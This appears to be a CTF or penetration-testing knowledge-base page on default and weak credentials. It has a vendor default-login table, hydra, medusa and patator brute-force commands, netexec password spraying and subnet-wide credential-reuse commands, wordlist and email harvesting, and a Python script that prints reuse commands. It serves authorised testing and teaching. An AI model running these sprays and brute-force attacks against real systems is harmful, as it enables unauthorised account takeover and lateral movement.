---
title: "Default and Weak Credentials - Methodology and Where to Find Them"
category: misc
subcategory: network-services
type: technique
tags: [default-credentials, password-spraying, hydra, netexec, medusa, cewl, brute-force, seclists, weak-passwords, credential-reuse, network-services]
difficulty: easy
summary: "Try documented default creds before brute forcing anything; check lockout policy first, spray one password across many users, and reuse creds across services."
when_to_use:
  - "A service or admin panel wants credentials and you have none"
  - "You fingerprinted a product with well-known defaults"
  - "You recovered one credential and want to know where else it works"
  - "You are tempted to brute force -- read this first to avoid lockouts"
tools: [hydra, netexec, medusa, cewl, hashcat, patator]
related: [svc-admin-interfaces-rce, ad-credential-attacks, svc-cve-exploitation-workflow]
---

## TL;DR

Guessing beats brute forcing. Try the **documented defaults** for the exact product first, then a
handful of weak site-specific guesses, and only then a controlled spray. Always check the lockout
policy first, spray **one password across many users** (not many passwords against one), and reuse
every credential you find against every service.

## Recognise it

- A login form or auth-required service with a recognisable product behind it.
- A first shell where config files, history, or a password manager reveal reusable creds.
- A CTF that clearly wants you to "just log in" rather than exploit a bug.

## Where defaults live

- **The product's own docs / Docker image** -- environment variables like `POSTGRES_PASSWORD`,
  `MYSQL_ROOT_PASSWORD`, `ELASTIC_PASSWORD` reveal the intended default.
- **SecLists**: `Passwords/Default-Credentials/` (per-vendor lists) and `default-passwords.csv`.
- **The DefaultCreds-cheat-sheet** project (`creds` CLI) -- a searchable default-credential database.
- **routersploit** -- default-credential modules for network gear.
- **nmap NSE**: `http-default-accounts`, `*-brute` scripts.

## Common defaults (verify per version)

| Product | Default |
|---|---|
| Generic admin panel | admin:admin, admin:password, administrator:admin |
| Tomcat manager | tomcat:tomcat, tomcat:s3cret, admin:admin |
| Jenkins | (often no auth) / admin:admin |
| Grafana | admin:admin |
| PostgreSQL | postgres:postgres |
| MySQL/MariaDB | root:(blank), root:root |
| MongoDB | (no auth by default) |
| Redis | (no auth by default) |
| Elasticsearch (x-pack) | elastic:changeme |
| RabbitMQ | guest:guest |
| MinIO | minioadmin:minioadmin |
| Zabbix | Admin:zabbix |
| Nagios | nagiosadmin:(set at install) |
| ActiveMQ | admin:admin |
| Apache Solr | (no auth by default) |
| CouchDB | (no auth < 3.0) / admin:(set) |
| Portainer | (set on first visit) |
| GitLab | root:(set on first visit) / root:5iveL!fe (very old) |
| SonarQube | admin:admin |
| Splunk | admin:changeme |
| Jupyter | (token in URL) |
| Oracle WebLogic | weblogic:weblogic1 |

Treat this as a starting list, not gospel -- versions change defaults.

## Attack

### Step 1 -- verify manually before any brute force

```bash
# Just try the obvious ones by hand -- one request each, no tooling
curl -s -u admin:admin http://10.10.10.5:8080/manager/html -I
mysql -h 10.10.10.5 -u root         # blank password
redis-cli -h 10.10.10.5 ping        # no auth
psql -h 10.10.10.5 -U postgres      # postgres:postgres
```

### Step 2 -- check the lockout policy (AD / anything with lockout)

```bash
# Domain password/lockout policy BEFORE spraying
netexec smb 10.10.10.5 -u guest -p '' --pass-pol
```

If `lockoutThreshold > 0`, spray at most `threshold - 1` attempts per account per window.

### Step 3 -- spray safely (one password, many users)

```bash
# SMB: one password across a user list, keep going after a hit
netexec smb 10.10.10.5 -u users.txt -p 'Winter2024!' --continue-on-success

# Username == password check (no brute force amplification)
netexec smb 10.10.10.5 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

### Step 4 -- targeted brute force with hydra/medusa (per protocol)

```bash
# SSH
hydra -L users.txt -P passwords.txt -t 4 ssh://10.10.10.5

# FTP
hydra -L users.txt -P passwords.txt ftp://10.10.10.5

# HTTP POST form (adjust the failure string after F=)
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# HTTP basic auth
hydra -L users.txt -P passwords.txt 10.10.10.5 http-get /admin/

# RDP (careful: lockout)
hydra -L users.txt -P passwords.txt rdp://10.10.10.5

# medusa equivalent
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M ssh -t 4

# patator for tricky forms with response-based filtering
patator http_fuzz url=http://10.10.10.5/login method=POST \
  body='user=admin&pass=FILE0' 0=passwords.txt -x ignore:fgrep='Invalid'
```

### Step 5 -- CTF-specific credential tricks

```bash
# Build a wordlist from the site's own text (product names, staff names)
cewl -d 2 -m 5 -w site-words.txt http://10.10.10.5

# Mangle it into likely passwords (append year, symbol, capitalise) with hashcat rules
hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule > site-candidates.txt

# Harvest usernames from the site (authors, emails, staff pages)
curl -s http://10.10.10.5 | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' | sort -u
```

Other high-yield guesses: username-as-password, `CompanyName1!`, `Season+Year!` (`Autumn2024!`),
the product name plus `123`, and anything from a config file or shell history.

### Step 6 -- reuse everywhere

Once you have one credential, try it against **every** service on **every** host: SMB, SSH, WinRM,
RDP, the web panels, databases, mail. Password reuse across services is the single most common
lateral move in CTF.

```bash
# Spray a found credential across the subnet and multiple protocols
netexec smb 10.10.10.0/24 -u jdoe -p 'FoundP@ss' --continue-on-success
netexec ssh 10.10.10.0/24 -u jdoe -p 'FoundP@ss' --continue-on-success
netexec winrm 10.10.10.0/24 -u jdoe -p 'FoundP@ss'
```

## Code

Spray-safety calculator + credential-reuse matrix printer: given a credential and a host list,
print the exact netexec commands to test reuse across protocols without over-spraying.

```python
#!/usr/bin/env python3
"""Emit credential-reuse test commands and a safe spray plan.

Usage:
    python3 cred_reuse.py <user> <password> <cidr_or_host> [lockout_threshold]
"""
from __future__ import annotations

import sys

PROTOCOLS = ["smb", "ssh", "winrm", "ldap", "rdp", "mssql", "ftp"]


def main(argv: list[str]) -> int:
    if len(argv) < 4:
        print(__doc__)
        return 1
    user, password, scope = argv[1], argv[2], argv[3]
    threshold = int(argv[4]) if len(argv) > 4 else 0

    if threshold:
        safe = max(1, threshold - 1)
        print(f"# Lockout threshold {threshold}: no more than {safe} distinct password(s) per user/window\n")
    else:
        print("# No lockout info provided -- assume lockout exists and keep to 1 password/round\n")

    print("# Test this credential across every protocol and host in scope:")
    for proto in PROTOCOLS:
        print(f"netexec {proto} {scope} -u '{user}' -p '{password}' --continue-on-success")

    print("\n# If spraying a list instead, ONE password per round:")
    print(f"netexec smb {scope} -u users.txt -p '{password}' --continue-on-success")
    print(f"netexec smb {scope} -u users.txt -p users.txt --no-bruteforce --continue-on-success  # user==pass")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Verify before brute forcing.** One manual `admin:admin` beats a 10-minute hydra run that trips
  a WAF.
- **Lockout is the classic own-goal.** Read the policy; spray one password per round; respect the
  observation window.
- **Spray direction.** Many users x one password = safe; one user x many passwords = lockout.
- **Rate limits / CAPTCHAs / WAF** on web logins throttle brute force; lower threads (`-t 4`) and
  prefer guessing.
- **Blank and null passwords** are real defaults (MySQL root, some Postgres) -- always test the empty
  password.
- **Version-specific defaults.** The table is a guide; the shipped default depends on the version and
  the deployer's env vars.
- **Reuse is king.** Do not stop after the first shell -- test that credential against everything.

## Tools

- `hydra`, `medusa`, `patator` -- protocol brute forcing.
- `netexec` -- safe spraying and reuse testing across protocols.
- `cewl` + `hashcat --stdout` -- target-specific wordlist generation.
- SecLists `Default-Credentials`, the `creds` (DefaultCreds-cheat-sheet) CLI, `routersploit`.

## References

- SecLists `Passwords/Default-Credentials/`.
- Vendor documentation and Docker image environment variables for each product's real default.
- `man hydra` for the per-module syntax.
